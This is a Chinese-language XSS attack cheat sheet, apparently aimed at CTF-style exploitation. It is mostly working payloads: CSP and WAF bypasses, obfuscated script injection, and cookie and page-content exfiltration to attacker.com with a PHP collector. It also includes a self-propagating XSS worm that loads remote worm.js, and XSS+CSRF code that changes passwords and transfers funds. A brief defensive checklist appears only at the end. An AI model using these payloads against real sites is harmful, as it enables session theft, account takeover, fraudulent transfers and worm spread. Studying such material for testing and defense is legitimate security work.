# XSS绕过秘笈

## CSP绕过技术

```html
<!-- link标签不受CSP script-src限制 -->
<link rel="prefetch" href="https://attacker.com/steal?cookie=document.cookie">
<link rel="dns-prefetch" href="//attacker.com/?data=">

<!-- CSP未禁止data:URI -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>
<img src="x" onerror="this.src='data:image/svg+xml;base64,...'">

<!-- 自定义字体 -->
<link rel="stylesheet" href="https://attacker.com/font.css">
```

## Payload混淆与编码

```html
<!-- HTML实体编码 -->
&lt;script&gt;alert('XSS')&lt;/script&gt;  &#60;script&#62;

<!-- Unicode编码 -->
\u003cscript\u003ealert('XSS')\u003c/script\u003e

<!-- 大小写混淆 -->
<ScRiPt>alert('XSS')</sCrIpT>  <IMG SRC=x OnErRoR=alert('XSS')>

<!-- 字符分割 -->
eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41));
```

## DOM-based XSS利用

### 危险操作
```javascript
// 直接设置HTML
document.body.innerHTML = userInput;
$("element").html(userInput);

// eval类操作
eval(userInput);  setTimeout(userInput, 100);
```

### 事件处理器
```html
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">
<input onfocus="alert('XSS')">
```

### body标签绕过script过滤
```html
<body onload="window.open('http://attacker.com/?1='+document.cookie)"></body>
<body/**/onload="alert('XSS')"></body>  <!-- 注释绕过空格 -->
<body<!-- -->onload="alert('XSS')"></body>
```

### 动态脚本加载与内容提取
```javascript
// 动态加载脚本
var script = document.createElement('script');
script.src = 'https://attacker.com/payload.js';
document.body.appendChild(script);

// jQuery获取页面内容
$('.flag').each(function(){
    window.open("http://attacker.com/?1="+$(this).text());
});
var content = document.body.innerHTML;
window.open("http://attacker.com/?1="+encodeURIComponent(content));
```

## Cookie获取与外带技术

```javascript
// 获取cookie方法
window.open("http://attacker.com/?1="+document.cookie);
window.location.href='http://attacker.com/?1='+document.cookie;
window.location='http://attacker.com/?1='+document.cookie;
location.replace('http://attacker.com/?1='+document.cookie);
```

**服务器接收脚本**:
```php
<?php
$content = $_GET[1];
if(isset($content)) file_put_contents('/tmp/flag.txt', $content);
?>
```

**适用场景**: 反射型/存储型XSS获取管理员cookie或敏感信息

## XSS蠕虫与自动传播

```javascript
// XMLHttpRequest自动发送恶意评论
(function() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/api/comment', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        content: '<script src="http://attacker.com/worm.js"></script>'
    }));
})();

// 自我传播
var payload = '<img src=x onerror="/* worm code */">';
fetch('/api/profile', { method: 'POST', body: JSON.stringify({bio: payload}) });

// 社交网络传播链
fetch('/api/user/bio', {
    method: 'PUT',
    body: JSON.stringify({ bio: '<img src=x onerror="/* code */">' })
});
fetch('/api/follow', {body: JSON.stringify({uid: randomUID})});
```

## SVG和特殊标签

```html
<!-- SVG脚本执行 -->
<svg onload="alert('XSS')"></svg>
<svg><script>alert('XSS')</script></svg>

<!-- Form注入 -->
<form action="https://attacker.com" method="POST">
<input type="hidden" name="data" value=""><input type="submit">
</form>

<!-- Iframe沙箱逃逸 -->
<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
<iframe src="javascript:alert('XSS')"></iframe>

<!-- 样式注入 -->
<style>body { background: url('javascript:alert("XSS")'); }</style>
<link rel="stylesheet" href="data:text/css,body{background:url(javascript:alert(1))}">
```

## WAF和过滤器绕过

### 关键词过滤
```html
<scr<script>ipt>alert('XSS')</script>  <!-- 标签嵌套 -->
<script>al/**/ert('XSS')</script>       <!-- 注释分割 -->
<script>a\x6cert('XSS')</script>        <!-- 十六进制编码 -->
<img src=x onerror=alert`XSS`>          <!-- 反引号 -->
```

### 属性引号混淆
```html
<img src=x onerror=alert(1)>            <!-- 无引号 -->
<img src=x onerror='alert(1)'>          <!-- 单引号 -->
<img src=x onerror="alert(1)">          <!-- 双引号 -->
<img src=x onerror=`alert(1)`>          <!-- 反引号 -->
```

### 空白字符与换行
```html
<img
src=x
onerror=alert(1)>

<img	src=x	onerror=alert(1)>           <!-- Tab字符 -->
<img src=x one/**/rror=alert(1)>        <!-- 注释分割 -->
```

### 大小写与编码组合
```html
<ImG SrC=x OnErRoR=alert(1)>
<IMG SRC=X ONERROR=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror="\x61\x6c\x65\x72\x74(1)">
```

## 协议和事件处理器绕过

### JavaScript伪协议
```html
<a href="javascript:alert('XSS')">click</a>
<a href="JavaScript:alert('XSS')">click</a>           <!-- 大小写 -->
<a href="java&#115;cript:alert('XSS')">click</a>    <!-- 编码 -->
<a href="java<!-- -->script:alert('XSS')">click</a> <!-- 注释 -->
```

### 事件处理器替代
```html
<img src=x onerror=alert(1)>
<img src=x onload=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<details ontoggle=alert(1) open>
<marquee onstart=alert(1)>
<video onmouseover=alert(1)>x</video>
<audio ontimeupdate=alert(1) controls src=x></audio>

<!-- 动画事件 -->
<style>@keyframes x{}</style>
<div style="animation:x" onanimationstart=alert(1)></div>

<!-- 页面事件 -->
<body onscroll=alert(1)>
<iframe onload=alert(1) src="about:blank"></iframe>
```

## XSS+CSRF组合利用

### GET方式修改密码
```javascript
<script>window.location.href='http://127.0.0.1/api/change.php?p=123'</script>
<script>window.open('http://127.0.0.1/api/change.php?p=123')</script>
```

### POST方式修改密码
```javascript
// jQuery ajax
$.ajax({url:"/api/change.php", method:"POST", data:{p:"1234"}});

// fetch API
fetch('/api/change.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'p=1234'
});

// XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/change.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('p=1234');

// Form表单自动提交
var form = document.createElement('form');
form.method = 'POST';
form.action = '/api/change.php';
var input = document.createElement('input');
input.type = 'hidden';
input.name = 'p';
input.value = '1234';
form.appendChild(input);
document.body.appendChild(form);
form.submit();
```

### 转账操作
```javascript
// jQuery
$.ajax({url:"/api/amount.php", method:"POST", data:{u:123, a:10000}});

// fetch
fetch('/api/amount.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'u=123&a=10000'
});
```

**利用场景**: 存储型XSS在管理员访问时自动执行敏感操作，绕过CSRF token

## 快速定位和利用优先级

**关键词识别**:
- innerHTML、outerHTML直接赋值
- eval()、new Function()执行用户输入
- dangerouslySetInnerHTML（React）、v-html（Vue）
- 事件处理器（onclick、onerror等）

**测试优先级**:
1. 反射型XSS（简单Payload）
2. 编码+大小写绕过
3. 存储型XSS
4. DOM-based XSS
5. 事件处理器替代
6. CSP绕过
7. 协议混淆
8. Cookie获取外带
9. jQuery利用
10. XSS+CSRF组合
11. 蠕虫传播

## 防御检查清单

### XSS基础防御
- ✓ 所有用户输入进行HTML编码
- ✓ 使用innerText而非innerHTML
- ✓ 避免使用eval()和new Function()
- ✓ 实施严格的CSP策略
- ✓ 使用安全的模板引擎（自动转义）
- ✓ 验证和清理URL中的javascript:协议
- ✓ 使用DOMPurify等专业库清理HTML

### XSS+CSRF组合防御
- ✓ 敏感操作必须验证CSRF token
- ✓ 敏感操作使用POST，避免GET
- ✓ 检查Referer头
- ✓ 使用SameSite Cookie属性
- ✓ 对存储型XSS严格过滤
- ✓ 限制jQuery等库使用
